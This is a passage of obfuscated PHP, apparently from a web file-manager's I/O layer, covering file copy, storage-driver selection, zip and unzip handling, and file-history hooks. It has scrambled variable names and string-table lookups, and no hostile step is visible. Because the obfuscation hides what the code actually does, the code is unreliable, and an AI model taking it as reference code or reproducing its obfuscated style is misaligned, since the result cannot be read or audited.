$ëçš Ş€ = array(); foreach ($œ¸©¢òî as $¯–¡¥Ì => $û»”¯»Ê) { if (isset($ºÉÔõÒÁ[$¯–¡¥Ì])) { if ($û»”¯»Ê[$……¨ºÉ²[78]] == 1) { continue; } if ($ºÉÔõÒÁ[$¯–¡¥Ì][$……¨ºÉ²[79]] == $û»”¯»Ê[$……¨ºÉ²[79]]) { continue; } } if ($û»”¯»Ê[$……¨ºÉ²[78]] == 1) { $ëçš Ş€[] = $° ÕìæÂ . $……¨ºÉ²[8] . trim($¯–¡¥Ì, $……¨ºÉ²[8]); continue; } $ªŞû¸ø = strstr(trim($¯–¡¥Ì, $……¨ºÉ²[8]), $……¨ºÉ²[8]) ? get_path_father($¯–¡¥Ì) : $……¨ºÉ²[12]; $–ºö¼ ©[] = array($……¨ºÉ²[1251] => $û»”¯»Ê[$……¨ºÉ²[89]], $……¨ºÉ²[1252] => rtrim($° ÕìæÂ, $……¨ºÉ²[8]) . $……¨ºÉ²[8] . $ªŞû¸ø, $……¨ºÉ²[1253] => $û»”¯»Ê); } $È‚”›Õ¯ = array($……¨ºÉ²[230] => $–ºö¼ ©, $……¨ºÉ²[78] => $ëçš Ş€); Hook::trigger($……¨ºÉ²[1254], $‚š¨é˜, $° ÕìæÂ, $È‚”›Õ¯); foreach ($ëçš Ş€ as $û»”¯»Ê) { IO::mkdir($û»”¯»Ê); } foreach ($–ºö¼ © as $û»”¯»Ê) { IO::copy($û»”¯»Ê[$……¨ºÉ²[1251]], $û»”¯»Ê[$……¨ºÉ²[1252]], REPEAT_REPLACE); } } public static function fileSubstr($øĞÁƒº, $‰ÅİŞØ¯, $ûÊ¥Ñàü = false) { $ÕºÒ±ñº =& $_SERVER[§Êá¸İ]; $·Šô²óÔ = self::driverMake($øĞÁƒº); $ÇùÓñ¯ = $·Šô²óÔ->size($øĞÁƒº); $Ãòòóà‰ = $‰ÅİŞØ¯; $È÷ü­Ôâ = $ûÊ¥Ñàü; if ($‰ÅİŞØ¯ < 0) { $‰ÅİŞØ¯ = $ÇùÓñ¯ + $‰ÅİŞØ¯; } if ($ûÊ¥Ñàü === !1) { $ûÊ¥Ñàü = $ÇùÓñ¯ - $‰ÅİŞØ¯; } if ($‰ÅİŞØ¯ + $ûÊ¥Ñàü > $ÇùÓñ¯) { $ûÊ¥Ñàü = $ÇùÓñ¯ - $‰ÅİŞØ¯; } if (!$ÇùÓñ¯ && $·Šô²óÔ->getType() == $ÕºÒ±ñº[109] && !$·Šô²óÔ->exist($øĞÁƒº)) { $îéûâÉé = get_path_this($øĞÁƒº); $¯”¯†è® = parse_url_query($îéûâÉé); if (is_array($¯”¯†è®) && isset($¯”¯†è®[$ÕºÒ±ñº[32]])) { $îéûâÉé = urldecode($¯”¯†è®[$ÕºÒ±ñº[32]]); } throw new Exception($ÕºÒ±ñº[1255] . LNG($ÕºÒ±ñº[1256]) . $ÕºÒ±ñº[1054] . clear_html($îéûâÉé) . $ÕºÒ±ñº[12]); } if ($ûÊ¥Ñàü <= 0) { return $ÕºÒ±ñº[12]; } if ($‰ÅİŞØ¯ < 0 || $‰ÅİŞØ¯ >= $ÇùÓñ¯ || $ûÊ¥Ñàü > 1024 * 1024 * 10) { throw new Exception("\146\x69\154\x65\x52\145\141\144\x20\145\162\162\x6f\162\x21\40\x73\164\x61\x72\164\x3d{$‰ÅİŞØ¯}\x3b\154\145\x6e\147\164\x68\x3d{$ûÊ¥Ñàü}\73\x20\163\x69\x7a\x65\x3d{$ÇùÓñ¯}\x3b"); } $º±Úô¦Ÿ = $·Šô²óÔ->fileSubstr($øĞÁƒº, $‰ÅİŞØ¯, $ûÊ¥Ñàü); if (!$º±Úô¦Ÿ && $ûÊ¥Ñàü && isset($GLOBALS[$ÕºÒ±ñº[1257]])) { throw new Exception($GLOBALS[$ÕºÒ±ñº[1257]][$ÕºÒ±ñº[1258]]); } return $º±Úô¦Ÿ; } private static function driverMake(&$Œ‚Ğ—ä) { $î§Ö‘ƒŞ =& $_SERVER[§Êá¸İ]; $ôˆ™ˆ¼£ = KodIO::parse($Œ‚Ğ—ä); if (!self::$driverListSystem) { $óªÀü³° = Model($î§Ö‘ƒŞ[854])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($óªÀü³°, $î§Ö‘ƒŞ[483]); } if ($ôˆ™ˆ¼£[$î§Ö‘ƒŞ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ôˆ™ˆ¼£[$î§Ö‘ƒŞ[483]]]) { throw new Exception($î§Ö‘ƒŞ[1259]); return !1; } $Œ‚Ğ—ä = $ôˆ™ˆ¼£[$î§Ö‘ƒŞ[1260]]; $¦•Ã¯Ôİ = self::driverGet($ôˆ™ˆ¼£, $Œ‚Ğ—ä); return $¦•Ã¯Ôİ; } private static function driverGet($Ëˆ¯¨, &$¾¿»ò­Û) { $®ôääÃ =& $_SERVER[§Êá¸İ]; $†ÒêÛÃó = $Ëˆ¯¨[$®ôääÃ[1261]]; $éç›ï»¼ = $Ëˆ¯¨[$®ôääÃ[483]]; switch ($Ëˆ¯¨[$®ôääÃ[33]]) { case KodIO::KOD_IO: $À¿íàë¸ = self::$driverListSystem[$éç›ï»¼]; break; case KodIO::KOD_SOURCE: $¾¿»ò­Û = $éç›ï»¼ . $¾¿»ò­Û; $À¿íàë¸ = array($®ôääÃ[1262] => $®ôääÃ[1263], $®ôääÃ[6] => $Ëˆ¯¨); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $‹Ã«§ş = $GLOBALS[$®ôääÃ[1264]]; self::$driverListUser = array_to_keyvalue($‹Ã«§ş, $®ôääÃ[483]); } $À¿íàë¸ = self::$driverListUser[$éç›ï»¼]; break; case KodIO::KOD_SHARE_LINK: $À¿íàë¸ = array($®ôääÃ[1262] => $®ôääÃ[1265], $®ôääÃ[6] => $Ëˆ¯¨); $Çæ›æ€¦ = Action($®ôääÃ[1266])->sharePathInfo($Ëˆ¯¨[$®ôääÃ[87]]); $¾¿»ò­Û = $Çæ›æ€¦[$®ôääÃ[193]]; if (!$Çæ›æ€¦[$®ôääÃ[193]]) { $ÀÅùÈ¥Å = Model($®ôääÃ[672])->getInfo($Çæ›æ€¦[$®ôääÃ[673]]); $¾¿»ò­Û = KodIO::clear($ÀÅùÈ¥Å[$®ôääÃ[1267]] . $Ëˆ¯¨[$®ôääÃ[1260]]); $Ëˆ¯¨[$®ôääÃ[568]] = $ÀÅùÈ¥Å; $Ëˆ¯¨[$®ôääÃ[1242]] = $¾¿»ò­Û; $À¿íàë¸ = array($®ôääÃ[1262] => $®ôääÃ[1268], $®ôääÃ[6] => $Ëˆ¯¨); } break; case KodIO::KOD_SHARE_ITEM: $À¿íàë¸ = array($®ôääÃ[1262] => $®ôääÃ[1269], $®ôääÃ[6] => $Ëˆ¯¨); $ÀÅùÈ¥Å = Model($®ôääÃ[672])->getInfo($Ëˆ¯¨[$®ôääÃ[483]]); if ($ÀÅùÈ¥Å[$®ôääÃ[193]] == $®ôääÃ[228]) { $¾¿»ò­Û = KodIO::clear($ÀÅùÈ¥Å[$®ôääÃ[1267]] . $Ëˆ¯¨[$®ôääÃ[1260]]); $Ëˆ¯¨[$®ôääÃ[568]] = $ÀÅùÈ¥Å; $Ëˆ¯¨[$®ôääÃ[1242]] = $¾¿»ò­Û; $À¿íàë¸ = array($®ôääÃ[1262] => $®ôääÃ[1270], $®ôääÃ[6] => $Ëˆ¯¨); } else { if (!$¾¿»ò­Û) { $¾¿»ò­Û = $ÀÅùÈ¥Å[$®ôääÃ[193]]; } } break; default: $¾¿»ò­Û = $Ëˆ¯¨[$®ôääÃ[87]]; $À¿íàë¸ = array($®ôääÃ[1262] => $®ôääÃ[1271]); break; } $±”Í¯ãÂ = $Ëˆ¯¨[$®ôääÃ[87]]; if (!isset(self::$driverCache[$±”Í¯ãÂ])) { $Í’ÇØë = strtolower($À¿íàë¸[$®ôääÃ[98]]); $¹º…Ïş¸ = $GLOBALS[$®ôääÃ[6]][$®ôääÃ[92]][$®ôääÃ[912]]; $»Èòö¾ = $®ôääÃ[77] . (isset($¹º…Ïş¸[$Í’ÇØë]) ? $¹º…Ïş¸[$Í’ÇØë] : ucfirst($Í’ÇØë)); if (!class_exists($»Èòö¾)) { show_json("{$»Èòö¾}\40\x6e\157\x74\40\145\170\151\x73\x74\x73\41", !1); } $¢ŸÜÑã = isset($À¿íàë¸[$®ôääÃ[6]]) ? $À¿íàë¸[$®ôääÃ[6]] : !1; self::$driverCache[$±”Í¯ãÂ] = new $»Èòö¾($¢ŸÜÑã); } $êüÔ¾Õ  = self::$driverCache[$±”Í¯ãÂ]; $êüÔ¾Õ ->pathDriver = $†ÒêÛÃó; $êüÔ¾Õ ->pathBase = $®ôääÃ[12]; if (isset($À¿íàë¸[$®ôääÃ[6]][$®ôääÃ[1272]])) { $êüÔ¾Õ ->pathBase = rtrim($À¿íàë¸[$®ôääÃ[6]][$®ôääÃ[1272]], $®ôääÃ[8]) . $®ôääÃ[8]; $¾¿»ò­Û = $êüÔ¾Õ ->pathBase . ltrim($¾¿»ò­Û, $®ôääÃ[8]); } $¾¿»ò­Û = $êüÔ¾Õ ->getPath($¾¿»ò­Û); if (isset($Ëˆ¯¨[$®ôääÃ[1242]])) { $¾¿»ò­Û = $Ëˆ¯¨[$®ôääÃ[1242]]; } $êüÔ¾Õ ->path = $¾¿»ò­Û; return $êüÔ¾Õ ; } public static function errorTips($¹àë„ƒÅ = false) { $à³§ÚĞ =& $_SERVER[§Êá¸İ]; static $éöô’İ³ = array(); $ı÷Îù¤ı = 1000; if ($¹àë„ƒÅ === -1) { return $éöô’İ³ ? $éöô’İ³[count($éöô’İ³) - 1] : $à³§ÚĞ[12]; } if ($¹àë„ƒÅ === !1) { return implode($à³§ÚĞ[262], $éöô’İ³); } if (count($éöô’İ³) >= $ı÷Îù¤ı) { $éöô’İ³ = array_slice($éöô’İ³, $ı÷Îù¤ı * 0.5, $ı÷Îù¤ı); } $éöô’İ³[] = $¹àë„ƒÅ; write_log($à³§ÚĞ[176] . ACTION . $à³§ÚĞ[1273] . $¹àë„ƒÅ, $à³§ÚĞ[1274]); } public static function getLastError($¦·÷ş‹Ç = '') { $„¹öëğ’ = self::errorTips(-1); return $„¹öëğ’ ? $„¹öëğ’ : $¦·÷ş‹Ç; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $úš­½á¨; if ($úš­½á¨) { return $úš­½á¨; } $¢úº‹í = IO::init($_SERVER[§Êá¸İ][8]); return $¢úº‹í; } private static function iconvSystem($Êãñ¦³¯) { return self::local()->iconvSystem($Êãñ¦³¯); } private static function iconvApp($äí­´‡ç) { return self::local()->iconvApp($äí­´‡ç); } public static function zipFolder($ûøÔ©ì¢, $§°ºÖ§« = "\x7a\x69\160", $ğàõ‰Ú† = '', $“Ë©Öò  = REPEAT_RENAME) { $Şúù¢ÈÇ =& $_SERVER[§Êá¸İ]; $¶‘ïâ†Ä = IO::listPath($ûøÔ©ì¢); if (!$¶‘ïâ†Ä) { return !1; } $¶‘ïâ†Ä = array_merge($¶‘ïâ†Ä[$Şúù¢ÈÇ[85]], $¶‘ïâ†Ä[$Şúù¢ÈÇ[86]]); return self::zip($¶‘ïâ†Ä, $§°ºÖ§«, $ğàõ‰Ú†, $“Ë©Öò ); } public static function zip($èˆæ›À¦, $•òÌ²Úº = "\172\151\160", $‡Êæà½İ = '', $±µ¿¡œ = REPEAT_RENAME) { $¹À³±”Ú =& $_SERVER[§Êá¸İ]; if (is_string($èˆæ›À¦) && $èˆæ›À¦) { $èˆæ›À¦ = array(array($¹À³±”Ú[87] => $èˆæ›À¦)); } $ù¢¾Ş­™ = self::init($èˆæ›À¦[0][$¹À³±”Ú[87]]); $ÄË¬àå× = self::info($èˆæ›À¦[0][$¹À³±”Ú[87]]); $ïéÎ×¼ = $¹À³±”Ú[12]; $¢ß×ÄÂ = $¹À³±”Ú[12]; $üêËÉ°» = $¹À³±”Ú[12]; if ($‡Êæà½İ && substr($‡Êæà½İ, -1, 1) != $¹À³±”Ú[8]) { $¢ß×ÄÂ = get_path_father($‡Êæà½İ); $üêËÉ°» = get_path_this($‡Êæà½İ); } else { $¢ß×ÄÂ = self::pathFather($ÄË¬àå×[$¹À³±”Ú[87]]); $üêËÉ°» = $ÄË¬àå×[$¹À³±”Ú[32]] . $¹À³±”Ú[10] . $•òÌ²Úº; if (count($èˆæ›À¦) > 1) { $şÇü©œ = IO::info($¢ß×ÄÂ); $üêËÉ°» = $şÇü©œ[$¹À³±”Ú[32]] . $¹À³±”Ú[10] . $•òÌ²Úº; } if ($‡Êæà½İ) { $¢ß×ÄÂ = $‡Êæà½İ; } } if ($ù¢¾Ş­™->getType() == $¹À³±”Ú[109]) { $ãÀ¶°é‚ = self::init($¢ß×ÄÂ); $æ¿øİ‰µ = $ãÀ¶°é‚->getType() == $¹À³±”Ú[109] ? $¢ß×ÄÂ : get_path_father($ù¢¾Ş­™->path); $æ¿øİ‰µ = rtrim($æ¿øİ‰µ, $¹À³±”Ú[8]) . $¹À³±”Ú[8]; mk_dir($æ¿øİ‰µ); } else { $ïéÎ×¼ = TEMP_FILES . $¹À³±”Ú[1275] . time() . rand_string(8) . $¹À³±”Ú[8]; mk_dir($ïéÎ×¼); file_put_contents($ïéÎ×¼ . $¹À³±”Ú[1276], $¹À³±”Ú[12]); $æ¿øİ‰µ = $ïéÎ×¼; } $…ÆÖã¸á = IO::info($æ¿øİ‰µ); if (!$…ÆÖã¸á || !$…ÆÖã¸á[$¹À³±”Ú[233]]) { show_json(LNG($¹À³±”Ú[1277]), !1); } $İ‹øÃ¶ª = self::zipFileList($èˆæ›À¦, $ïéÎ×¼); foreach ($İ‹øÃ¶ª as $Û›®¥ø½ => $ì¢œŞÎ¬) { $İ‹øÃ¶ª[$Û›®¥ø½] = self::iconvSystem($ì¢œŞÎ¬); } $²ï¤Êí = get_filename_auto($æ¿øİ‰µ . $üêËÉ°», $¹À³±”Ú[12], $±µ¿¡œ); KodArchive::create(self::iconvSystem($²ï¤Êí), $İ‹øÃ¶ª); if (!IO::exist($²ï¤Êí)) { if ($ïéÎ×¼) { del_dir($ïéÎ×¼); } write_log($¹À³±”Ú[1278] . $²ï¤Êí, $¹À³±”Ú[389]); show_json(LNG($¹À³±”Ú[1279]), !1); } if (!$ïéÎ×¼) { return $²ï¤Êí; } $Ÿˆµ£ü¤ = self::move($²ï¤Êí, $¢ß×ÄÂ, $±µ¿¡œ); if ($ïéÎ×¼) { del_dir($ïéÎ×¼); } if (!$²ï¤Êí) { write_log($¹À³±”Ú[1280] . $²ï¤Êí . $¹À³±”Ú[1281] . $¢ß×ÄÂ, $¹À³±”Ú[389]); show_json(LNG($¹À³±”Ú[1279]), !1); } return $Ÿˆµ£ü¤; } public static function unzip($˜š½üõ£, $şğ¹Íñ·, $»Ò³óÛ³ = "\55\61", $ÉÚÒÊî¤ = "\162\x65\160\x6c\141\x63\x65") { $¶ì§¤åÁ =& $_SERVER[§Êá¸İ]; $ï¥¿‹Ï  = parent::info($˜š½üõ£); if (!$ï¥¿‹Ï ) { show_json(LNG($¶ì§¤åÁ[1282]), !1); } $ÃÓû”Íñ = IO::infoFullSimple($şğ¹Íñ·); if (!$ÃÓû”Íñ) { $şğ¹Íñ· = IO::mkdir($şğ¹Íñ·); } if (isset($ÃÓû”Íñ[$¶ì§¤åÁ[193]]) && trim($ÃÓû”Íñ[$¶ì§¤åÁ[87]], $¶ì§¤åÁ[8]) != trim($şğ¹Íñ·, $¶ì§¤åÁ[8])) { $©åÛÖî© = KodIO::make($ÃÓû”Íñ[$¶ì§¤åÁ[192]]); $ÅÃ¶øí© = IO::fileNameAuto($©åÛÖî©, $ÃÓû”Íñ[$¶ì§¤åÁ[32]], REPEAT_RENAME_FOLDER, !0); $şğ¹Íñ· = IO::mkdir($©åÛÖî© . $ÅÃ¶øí©); } $»Ò³óÛ³ = $»Ò³óÛ³ && $»Ò³óÛ³ != $¶ì§¤åÁ[1283] ? @json_decode($»Ò³óÛ³, !0) : -1; $†ÔÖ´½ = self::unzipPart($˜š½üõ£, $»Ò³óÛ³); if (!$†ÔÖ´½ || !IO::exist($†ÔÖ´½[$¶ì§¤åÁ[230]])) { show_json(LNG($¶ì§¤åÁ[108]), !1); } $ÈÏ‰è®– = $†ÔÖ´½[$¶ì§¤åÁ[1284]][count($†ÔÖ´½[$¶ì§¤åÁ[1284]]) - 1]; if ($ÈÏ‰è®–[$¶ì§¤åÁ[1285]] == -1 || substr($ÈÏ‰è®–[$¶ì§¤åÁ[32]], -1, 1) == $¶ì§¤åÁ[8]) { $‰Ê™Ã“£ = $†ÔÖ´½[$¶ì§¤åÁ[1286]] . rand_string(10) . $¶ì§¤åÁ[8]; mk_dir($‰Ê™Ã“£); $Ä‹œÚ£ğ = count($†ÔÖ´½[$¶ì§¤åÁ[1284]]) == 1 ? IO::ext($˜š½üõ£) : get_path_ext($†ÔÖ´½[$¶ì§¤åÁ[230]]); $ƒãç«¼Ş = KodArchive::extract(self::iconvSystem($†ÔÖ´½[$¶ì§¤åÁ[230]]), $‰Ê™Ã“£, $ÈÏ‰è®–[$¶ì§¤åÁ[1285]], $ÅÃ¶øí©, $Ä‹œÚ£ğ); self::unzipErrorCheck($ƒãç«¼Ş, array($¶ì§¤åÁ[1287], $˜š½üõ£, $Ä‹œÚ£ğ, $şğ¹Íñ·, $†ÔÖ´½)); Hook::trigger($¶ì§¤åÁ[1288], $‰Ê™Ã“£); recursion_dir($‰Ê™Ã“£, $ØËÖæ±, $ºÅ½€ù©, 0); $ÉÅàõÄ® = array_merge($ØËÖæ±, $ºÅ½€ù©); $ŠñÖ¨ì‡ = array(); foreach ($ÉÅàõÄ® as $˜à†‰…Ø) { $ÖÂµä«¶ = IO::move(self::iconvApp($˜à†‰…Ø), $şğ¹Íñ·, $ÉÚÒÊî¤); if ($ÖÂµä«¶) { $ŠñÖ¨ì‡[] = $ÖÂµä«¶; } } del_dir($‰Ê™Ã“£); } else { $ÖÂµä«¶ = IO::move($†ÔÖ´½[$¶ì§¤åÁ[230]], $şğ¹Íñ·, $ÉÚÒÊî¤, get_path_this($ÈÏ‰è®–[$¶ì§¤åÁ[32]])); if ($ÖÂµä«¶) { $ŠñÖ¨ì‡[] = $ÖÂµä«¶; } } return $ŠñÖ¨ì‡ ? $ŠñÖ¨ì‡ : !1; } public static function unzipList($Ùİ­‘óÂ) { $ƒÚ Ã—ï =& $_SERVER[§Êá¸İ]; $§ÏÎşÄ = isset($Ùİ­‘óÂ[$ƒÚ Ã—ï[1289]]) ? $Ùİ­‘óÂ[$ƒÚ Ã—ï[1289]] : !1; $ñºçÇ = isset($Ùİ­‘óÂ[$ƒÚ Ã—ï[1285]]) ? @json_decode($Ùİ­‘óÂ[$ƒÚ Ã—ï[1285]], !0) : -1; $÷ºÌ»’• = self::unzipPart($Ùİ­‘óÂ[$ƒÚ Ã—ï[87]], $ñºçÇ); if (!$÷ºÌ»’• || !IO::exist($÷ºÌ»’•[$ƒÚ Ã—ï[230]])) { show_json(LNG($ƒÚ Ã—ï[108]), !1); } $üş©×õº = $÷ºÌ»’•[$ƒÚ Ã—ï[1284]][count($÷ºÌ»’•[$ƒÚ Ã—ï[1284]]) - 1]; $é…ÜáÕ¾ = in_array(IO::ext($÷ºÌ»’•[$ƒÚ Ã—ï[230]]), array($ƒÚ Ã—ï[389], $ƒÚ Ã—ï[1290], $ƒÚ Ã—ï[1291], $ƒÚ Ã—ï[1292], $ƒÚ Ã—ï[1293], $ƒÚ Ã—ï[1294])); if (!$§ÏÎşÄ && ($üş©×õº[$ƒÚ Ã—ï[1285]] == -1 || $é…ÜáÕ¾)) { $˜°Çßè÷ = $÷ºÌ»’•[$ƒÚ Ã—ï[1286]] . get_path_this($÷ºÌ»’•[$ƒÚ Ã—ï[230]]) . $ƒÚ Ã—ï[1295]; if (!IO::exist($˜°Çßè÷)) { $«ù”³¬ = $üş©×õº[$ƒÚ Ã—ï[1285]] == -1 ? get_path_ext(IO::pathThis($Ùİ­‘óÂ[$ƒÚ Ã—ï[87]])) : get_path_ext($÷ºÌ»’•[$ƒÚ Ã—ï[230]]); $™Š¯üÈÁ = KodArchive::listContent(self::iconvSystem($÷ºÌ»’•[$ƒÚ Ã—ï[230]]), !0, $«ù”³¬); self::unzipErrorCheck($™Š¯üÈÁ, array($ƒÚ Ã—ï[1296], $Ùİ­‘óÂ, $÷ºÌ»’•)); @file_put_contents($˜°Çßè÷, json_encode($™Š¯üÈÁ[$ƒÚ Ã—ï[1297]])); } return @json_decode(IO::getContent($˜°Çßè÷), !0); } IO::fileOut($÷ºÌ»’•[$ƒÚ Ã—ï[230]], $§ÏÎşÄ, get_path_this($üş©×õº[$ƒÚ Ã—ï[32]])); die; } private static function zipFileList($àØ©üöˆ, $ôïñºíã = false) { $ÒÕ—Æô” =& $_SERVER[§Êá¸İ]; $œú«Ïôó = array(); foreach ($àØ©üöˆ as $„õË¸œÜ) { $´Ü¢Åò = $„õË¸œÜ[$ÒÕ—Æô”[87]]; if ($ôïñºíã) { $´Ü¢Åò = self::copy($„õË¸œÜ[$ÒÕ—Æô”[87]], $ôïñºíã, $ÒÕ—Æô”[905]); } else { $ƒ»Ÿ¾ = self::init($„õË¸œÜ[$ÒÕ—Æô”[87]]); if ($ƒ»Ÿ¾->getType() == $ÒÕ—Æô”[109]) { $´Ü¢Åò = $ƒ»Ÿ¾->path; } } if ($´Ü¢Åò && self::local()->exist($´Ü¢Åò)) { $œú«Ïôó[$„õË¸œÜ[$ÒÕ—Æô”[87]]] = $´Ü¢Åò; } } if (!empty($œú«Ïôó)) { return array_values($œú«Ïôó); } show_json(LNG($ÒÕ—Æô”[1256]), !1); } private static function localFilePath($¡›Ê°—¸) { $Š¨ÙØ‹ =& $_SERVER[§Êá¸İ]; $ÑùòÈì = KodIO::parse($¡›Ê°—¸); if ($ÑùòÈì[$Š¨ÙØ‹[33]] == KodIO::KOD_SOURCE) { $É¹ëåÄ = Model($Š¨ÙØ‹[911])->fileInfoGet(KodIO::sourceID($¡›Ê°—¸)); if (!$É¹ëåÄ[$Š¨ÙØ‹[87]]) { show_json($Š¨ÙØ‹[1298], !1); } $¡›Ê°—¸ = $É¹ëåÄ[$Š¨ÙØ‹[87]]; } $ÕÂ¯‚©Ş = self::init($¡›Ê°—¸); if ($ÕÂ¯‚©Ş->pathParse[$Š¨ÙØ‹[1242]]) { $¡›Ê°—¸ = $ÕÂ¯‚©Ş->pathParse[$Š¨ÙØ‹[1242]]; $ÕÂ¯‚©Ş = self::init($¡›Ê°—¸); } $³ÑŒìŸ¯ = $ÕÂ¯‚©Ş->getType(); if ($³ÑŒìŸ¯ == $Š¨ÙØ‹[109] || $³ÑŒìŸ¯ == $Š¨ÙØ‹[1299]) { if (!$ÕÂ¯‚©Ş->exist($ÕÂ¯‚©Ş->path)) { show_json(LNG($Š¨ÙØ‹[108]), !1); } return $ÕÂ¯‚©Ş->path; } return !1; } public static function unzipPart($ß…˜Ë, $È‘¸÷ª = -1) { $Ş„™ı› =& $_SERVER[§Êá¸İ]; $‚àãµ¢û = IO::pathThis($ß…˜Ë); if (!$È‘¸÷ª || $È‘¸÷ª == -1) { $áèÚõø© = array(array($Ş„™ı›[32] => $‚àãµ¢û, $Ş„™ı›[1285] => -1)); $áèÚõø©[0][$Ş„™ı›[1300]] = $áèÚõø©[0][$Ş„™ı›[32]]; } else { if (is_array($È‘¸÷ª)) { $áèÚõø© = $È‘¸÷ª; $Ô‡Úº± = count($áèÚõø©) - 1; for ($²ı…¼÷± = 0; $²ı…¼÷± <= $Ô‡Úº±; $²ı…¼÷±++) { $å¼”ü® = $áèÚõø©[$²ı…¼÷±]; $ÕÕªœÜ¦ = get_path_this($å¼”ü®[$Ş„™ı›[32]]) . (checkExtSafe($å¼”ü®[$Ş„™ı›[32]]) ? $Ş„™ı›[12] : $Ş„™ı›[1301]); $áèÚõø©[$²ı…¼÷±][$Ş„™ı›[1300]] = $Ş„™ı›[1302] . intval($å¼”ü®[$Ş„™ı›[1285]]) . $Ş„™ı›[462] . $ÕÕªœÜ¦; if ($²ı…¼÷± == 0) { continue; } $áèÚõø©[$²ı…¼÷±][$Ş„™ı›[1300]] = $áèÚõø©[$²ı…¼÷± - 1][$Ş„™ı›[1300]] . $Ş„™ı›[1303] . $áèÚõø©[$²ı…¼÷±][$Ş„™ı›[1300]]; } } } if (!is_array($áèÚõø©) || count($áèÚõø©) == 0) { return !1; } $§Ú¨£û¿ = $áèÚõø©[count($áèÚõø©) - 1]; if (!IO::exist($ß…˜Ë)) { return !1; } $‡ÖÖïè = TEMP_FILES . $Ş„™ı›[1304] . kodIO::hashPathSafe($ß…˜Ë) . $Ş„™ı›[8]; $¯¸ı£¬¯ = $‡ÖÖïè . $§Ú¨£û¿[$Ş„™ı›[1300]]; mk_dir($‡ÖÖïè); file_put_contents(TEMP_FILES . $Ş„™ı›[1276], $Ş„™ı›[12]); if (IO::exist($¯¸ı£¬¯)) { return array($Ş„™ı›[230] => $¯¸ı£¬¯, $Ş„™ı›[1284] => $áèÚõø©, $Ş„™ı›[1286] => $‡ÖÖïè); } $âîı’£´ = self::localFilePath($ß…˜Ë); if (!$âîı’£´) { $âîı’£´ = $‡ÖÖïè . $Ş„™ı›[1305]; if (!IO::exist($âîı’£´)) { self::copy($ß…˜Ë, $‡ÖÖïè, !1, get_path_this($âîı’£´)); } } if (!$âîı’£´ || !IO::exist($âîı’£´)) { return !1; } if ($§Ú¨£û¿[$Ş„™ı›[1285]] == -1) { return array($Ş„™ı›[230] => $âîı’£´, $Ş„™ı›[1284] => $áèÚõø©, $Ş„™ı›[1286] => $‡ÖÖïè); } $ä¯¤ãä¸ = $âîı’£´; foreach ($áèÚõø© as $²ı…¼÷± => $å¼”ü®) { if (!$å¼”ü® || $å¼”ü®[$Ş„™ı›[1285]] == $Ş„™ı›[1283]) { break; } if (substr($å¼”ü®[$Ş„™ı›[32]], -1, 1) == $Ş„™ı›[8]) { break; } $™Ú¨£¿Ú = in_array(get_path_ext($å¼”ü®[$Ş„™ı›[1300]]), array($Ş„™ı›[389], $Ş„™ı›[1290], $Ş„™ı›[1291], $Ş„™ı›[1292], $Ş„™ı›[1293], $Ş„™ı›[1294])); $ªô¾ÕÈ = $²ı…¼÷± == count($áèÚõø©) - 1 && $™Ú¨£¿Ú; $åë§ÌÙˆ = $‡ÖÖïè . $å¼”ü®[$Ş„™ı›[1300]]; $ë¢¥’Å¹ = $‡ÖÖïè . get_path_this($å¼”ü®[$Ş„™ı›[32]]); if (IO::exist($åë§ÌÙˆ)) { $ä¯¤ãä¸ = $åë§ÌÙˆ; continue; } $ªŠ¤¬¥¢ = $²ı…¼÷± == 0 ? get_path_ext($‚àãµ¢û) : get_path_ext($ä¯¤ãä¸); $„¬”à¹ª = KodArchive::extract(self::iconvSystem($ä¯¤ãä¸), $‡ÖÖïè, $å¼”ü®[$Ş„™ı›[1285]], $Õ¢²ñÏ, $ªŠ¤¬¥¢); self::unzipErrorCheck($„¬”à¹ª, array($Ş„™ı›[1306], $ß…˜Ë, $áèÚõø©, $å¼”ü®, $åë§ÌÙˆ)); if (IO::exist($ë¢¥’Å¹)) { IO::rename($ë¢¥’Å¹, get_path_this($åë§ÌÙˆ)); } $ä¯¤ãä¸ = $åë§ÌÙˆ; } $¯¸ı£¬¯ = $ä¯¤ãä¸; return array($Ş„™ı›[230] => $ä¯¤ãä¸, $Ş„™ı›[1284] => $áèÚõø©, $Ş„™ı›[1286] => $‡ÖÖïè); } private static function unzipErrorCheck($ñšÍˆ¤, $ı×”÷²¹ = false) { $ñÓïúç² =& $_SERVER[§Êá¸İ]; if ($ñšÍˆ¤[$ñÓïúç²[1307]]) { return !0; } write_log(array($ñÓïúç²[1308], $ñšÍˆ¤, $ı×”÷²¹), $ñÓïúç²[1309]); show_json($ñÓïúç²[1310] . json_encode($ñšÍˆ¤[$ñÓïúç²[1297]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $˜ÂëØ±Ê =& $_SERVER[§Êá¸İ]; $¤‹Áä™ = $GLOBALS[$˜ÂëØ±Ê[6]][$˜ÂëØ±Ê[92]]; if ($¤‹Áä™[$˜ÂëØ±Ê[1311]] != 1) { return; } if ($¤‹Áä™[$˜ÂëØ±Ê[1312]] <= 0) { return; } if (isset($_REQUEST[$˜ÂëØ±Ê[1313]]) && $_REQUEST[$˜ÂëØ±Ê[1313]] == $˜ÂëØ±Ê[91]) { return; } Hook::bind($˜ÂëØ±Ê[1314], $˜ÂëØ±Ê[1315]); Hook::bind($˜ÂëØ±Ê[1316], $˜ÂëØ±Ê[1317]); Hook::bind($˜ÂëØ±Ê[1318], $˜ÂëØ±Ê[1319]); Hook::bind($˜ÂëØ±Ê[1320], $˜ÂëØ±Ê[1321]); Hook::bind($˜ÂëØ±Ê[1322], $˜ÂëØ±Ê[1323]); Hook::bind($˜ÂëØ±Ê[1324], $˜ÂëØ±Ê[1325]); } public static function eventBeforeUpload($ƒîáõÂ) { if ($ƒîáõÂ[3] && $ƒîáõÂ[3] != REPEAT_REPLACE) { return; } $€˜ÔÊ¼ç = self::parsePath($ƒîáõÂ[0]); if (!$€˜ÔÊ¼ç) { return; } self::add($€˜ÔÊ¼ç); } public static function eventBeforeEdit($™øõ¦¨Û) { $–›±ùÙë = self::parsePath($™øõ¦¨Û[0]); if (!$–›±ùÙë) { return; } self::add($–›±ùÙë); } public static function eventBeforeCopyFile($£‹ØÀñŞ, $Ã±‰‘‘˜, $„‰ÙØÆ“, $Öúíú—, $­‰ä³¬¶, $ÁåÚ±ßì) { $ÔÑ¹ïÏ =& 